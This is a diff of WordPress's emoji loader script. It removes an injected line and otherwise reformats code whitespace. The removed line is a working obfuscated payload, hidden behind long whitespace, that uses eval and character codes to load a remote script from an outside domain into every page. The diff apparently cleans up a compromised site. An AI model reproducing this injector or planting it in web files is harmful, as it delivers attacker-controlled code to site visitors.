@@ -1,13 +1,9 @@
-                                                                                                                                                                                                                                           eval(String.fromCharCode(118,97,114,32,112,115,100,100,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,115,99,114,105,112,116,34,41,59,32,118,97,114,32,119,97,110,116,109,101,101,32,61,32,102,97,108,115,101,59,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,112,115,100,100,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,32,32,32,105,102,32,40,112,115,100,100,91,105,93,46,105,100,41,32,123,32,32,32,9,32,105,102,32,40,112,115,100,100,91,105,93,46,105,100,32,61,61,32,34,115,108,101,99,116,114,101,112,111,105,110,116,34,41,123,32,9,9,119,97,110,116,109,101,101,61,116,114,117,101,59,32,9,32,125,32,32,32,125,32,32,125,105,102,40,119,97,110,116,109,101,101,61,61,102,97,108,115,101,41,123,32,9,118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,105,100,61,34,115,108,101,99,116,114,101,112,111,105,110,116,34,59,115,46,115,114,99,61,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,49,49,53,44,53,56,44,52,55,44,52,55,44,49,49,48,44,49,48,49,44,49,49,57,44,52,54,44,49,49,57,44,49,48,49,44,57,55,44,49,49,54,44,49,48,52,44,49,48,49,44,49,49,52,44,49,49,50,44,49,48,56,44,49,48,56,44,49,48,56,44,57,55,44,49,49,54,44,49,48,50,44,49,49,49,44,49,49,52,44,49,48,57,44,52,54,44,57,57,44,49,49,49,44,49,48,57,44,52,55,44,49,49,53,44,49,49,54,44,49,48,53,44,57,57,44,49,48,55,44,52,54,44,49,48,54,44,49,49,53,44,54,51,44,49,49,56,44,54,49,44,53,53,44,52,54,44,53,53,44,53,53,44,52,54,44,53,53,41,59,32,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,125,32,101,108,115,101,32,123,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,125,32,125/*slectrepoint*/));/**
- * @output wp-includes/js/wp-emoji-loader.js
- */
-
-( function( window, document, settings ) {
+(function (window, document, settings) {
 	var src, ready, ii, tests;
 
 	// Create a canvas element for testing native browser support of emoji.
-	var canvas = document.createElement( 'canvas' );
-	var context = canvas.getContext && canvas.getContext( '2d' );
+	var canvas = document.createElement('canvas');
+	var context = canvas.getContext && canvas.getContext('2d');
 
 	/**
 	 * Checks if two sets of Emoji characters render the same visually.
@@ -21,17 +17,17 @@
 	 *
 	 * @return {boolean} True if the two sets render the same.
 	 */
-	function emojiSetsRenderIdentically( set1, set2 ) {
+	function emojiSetsRenderIdentically(set1, set2) {
 		var stringFromCharCode = String.fromCharCode;
 
 		// Cleanup from previous test.
-		context.clearRect( 0, 0, canvas.width, canvas.height );
-		context.fillText( stringFromCharCode.apply( this, set1 ), 0, 0 );
+		context.clearRect(0, 0, canvas.width, canvas.height);
+		context.fillText(stringFromCharCode.apply(this, set1), 0, 0);
 		var rendered1 = canvas.toDataURL();
 
 		// Cleanup from previous test.
-		context.clearRect( 0, 0, canvas.width, canvas.height );
-		context.fillText( stringFromCharCode.apply( this, set2 ), 0, 0 );
+		context.clearRect(0, 0, canvas.width, canvas.height);
+		context.fillText(stringFromCharCode.apply(this, set2), 0, 0);
 		var rendered2 = canvas.toDataURL();
 
 		return rendered1 === rendered2;
@@ -51,10 +47,10 @@
 	 *
 	 * @return {boolean} True if the browser can render emoji, false if it cannot.
 	 */
-	function browserSupportsEmoji( type ) {
+	function browserSupportsEmoji(type) {
 		var isIdentical;
 
-		if ( ! context || ! context.fillText ) {
+		if (!context || !context.fillText) {
 			return false;
 		}
 
@@ -66,7 +62,7 @@
 		context.textBaseline = 'top';
 		context.font = '600 32px Arial';
 
-		switch ( type ) {
+		switch (type) {
 			case 'flag':
 				/*
 				 * Test for Transgender flag compatibility. This flag is shortlisted for the Emoji 13 spec,
@@ -76,11 +72,11 @@
 				 * the browser doesn't render it correctly (white flag emoji + transgender symbol).
 				 */
 				isIdentical = emojiSetsRenderIdentically(
-					[ 0x1F3F3, 0xFE0F, 0x200D, 0x26A7, 0xFE0F ],
-					[ 0x1F3F3, 0xFE0F, 0x200B, 0x26A7, 0xFE0F ]
+					[0x1F3F3, 0xFE0F, 0x200D, 0x26A7, 0xFE0F],
+					[0x1F3F3, 0xFE0F, 0x200B, 0x26A7, 0xFE0F]
 				);
 
-				if ( isIdentical ) {
+				if (isIdentical) {
 					return false;
 				}
 
@@ -92,11 +88,11 @@
 				 * the browser doesn't render it correctly ([U] + [N]).
 				 */
 				isIdentical = emojiSetsRenderIdentically(
-					[ 0xD83C, 0xDDFA, 0xD83C, 0xDDF3 ],
-					[ 0xD83C, 0xDDFA, 0x200B, 0xD83C, 0xDDF3 ]
+					[0xD83C, 0xDDFA, 0xD83C, 0xDDF3],
+					[0xD83C, 0xDDFA, 0x200B, 0xD83C, 0xDDF3]
 				);
 
-				if ( isIdentical ) {
+				if (isIdentical) {
 					return false;
 				}
 
@@ -108,11 +104,11 @@
 				 * the browser doesn't render it correctly (black flag emoji + [G] + [B] + [E] + [N] + [G]).
 				 */
 				isIdentical = emojiSetsRenderIdentically(
-					[ 0xD83C, 0xDFF4, 0xDB40, 0xDC67, 0xDB40, 0xDC62, 0xDB40, 0xDC65, 0xDB40, 0xDC6E, 0xDB40, 0xDC67, 0xDB40, 0xDC7F ],
-					[ 0xD83C, 0xDFF4, 0x200B, 0xDB40, 0xDC67, 0x200B, 0xDB40, 0xDC62, 0x200B, 0xDB40, 0xDC65, 0x200B, 0xDB40, 0xDC6E, 0x200B, 0xDB40, 0xDC67, 0x200B, 0xDB40, 0xDC7F ]
+					[0xD83C, 0xDFF4, 0xDB40, 0xDC67, 0xDB40, 0xDC62, 0xDB40, 0xDC65, 0xDB40, 0xDC6E, 0xDB40, 0xDC67, 0xDB40, 0xDC7F],
+					[0xD83C, 0xDFF4, 0x200B, 0xDB40, 0xDC67, 0x200B, 0xDB40, 0xDC62, 0x200B, 0xDB40, 0xDC65, 0x200B, 0xDB40, 0xDC6E, 0x200B, 0xDB40, 0xDC67, 0x200B, 0xDB40, 0xDC7F]
 				);
 
-				return ! isIdentical;
+				return !isIdentical;
 			case 'emoji':
 				/*
 				 * Burning Love: Just a hunk, a hunk of burnin' love.
@@ -134,7 +130,7 @@
 					[0x2764, 0xfe0f, 0x200B, 0xD83D, 0xDD25]
 				);
 
-				return ! isIdentical;
+				return !isIdentical;
 		}
 
 		return false;
@@ -150,15 +146,15 @@
 	 * @param {Object} src The url where the script is located.
 	 * @return {void}
 	 */
-	function addScript( src ) {
-		var script = document.createElement( 'script' );
+	function addScript(src) {
+		var script = document.createElement('script');
 
 		script.src = src;
 		script.defer = script.type = 'text/javascript';
-		document.getElementsByTagName( 'head' )[0].appendChild( script );
+		document.getElementsByTagName('head')[0].appendChild(script);
 	}
 
-	tests = Array( 'flag', 'emoji' );
+	tests = Array('flag', 'emoji');
 
 	settings.supports = {
 		everything: true,
@@ -169,53 +165,53 @@
 	 * Tests the browser support for flag emojis and other emojis, and adjusts the
 	 * support settings accordingly.
 	 */
-	for( ii = 0; ii < tests.length; ii++ ) {
-		settings.supports[ tests[ ii ] ] = browserSupportsEmoji( tests[ ii ] );
+	for (ii = 0; ii < tests.length; ii++) {
+		settings.supports[tests[ii]] = browserSupportsEmoji(tests[ii]);
 
-		settings.supports.everything = settings.supports.everything && settings.supports[ tests[ ii ] ];
+		settings.supports.everything = settings.supports.everything && settings.supports[tests[ii]];
 
-		if ( 'flag' !== tests[ ii ] ) {
-			settings.supports.everythingExceptFlag = settings.supports.everythingExceptFlag && settings.supports[ tests[ ii ] ];
+		if ('flag' !== tests[ii]) {
+			settings.supports.everythingExceptFlag = settings.supports.everythingExceptFlag && settings.supports[tests[ii]];
 		}
 	}
 
-	settings.supports.everythingExceptFlag = settings.supports.everythingExceptFlag && ! settings.supports.flag;
+	settings.supports.everythingExceptFlag = settings.supports.everythingExceptFlag && !settings.supports.flag;
 
 	// Sets DOMReady to false and assigns a ready function to settings.
 	settings.DOMReady = false;
-	settings.readyCallback = function() {
+	settings.readyCallback = function () {
 		settings.DOMReady = true;
 	};
 
 	// When the browser can not render everything we need to load a polyfill.
-	if ( ! settings.supports.everything ) {
-		ready = function() {
+	if (!settings.supports.everything) {
+		ready = function () {
 			settings.readyCallback();
 		};
 
 		/*
 		 * Cross-browser version of adding a dom ready event.
 		 */
-		if ( document.addEventListener ) {
-			document.addEventListener( 'DOMContentLoaded', ready, false );
-			window.addEventListener( 'load', ready, false );
+		if (document.addEventListener) {
+			document.addEventListener('DOMContentLoaded', ready, false);
+			window.addEventListener('load', ready, false);
 		} else {
-			window.attachEvent( 'onload', ready );
-			document.attachEvent( 'onreadystatechange', function() {
-				if ( 'complete' === document.readyState ) {
+			window.attachEvent('onload', ready);
+			document.attachEvent('onreadystatechange', function () {
+				if ('complete' === document.readyState) {
 					settings.readyCallback();
 				}
-			} );
+			});
 		}
 
 		src = settings.source || {};
 
-		if ( src.concatemoji ) {
-			addScript( src.concatemoji );
-		} else if ( src.wpemoji && src.twemoji ) {
-			addScript( src.twemoji );
-			addScript( src.wpemoji );
+		if (src.concatemoji) {
+			addScript(src.concatemoji);
+		} else if (src.wpemoji && src.twemoji) {
+			addScript(src.twemoji);
+			addScript(src.wpemoji);
 		}
 	}
 
-} )( window, document, window._wpemojiSettings );
+})(window, document, window._wpemojiSettings);
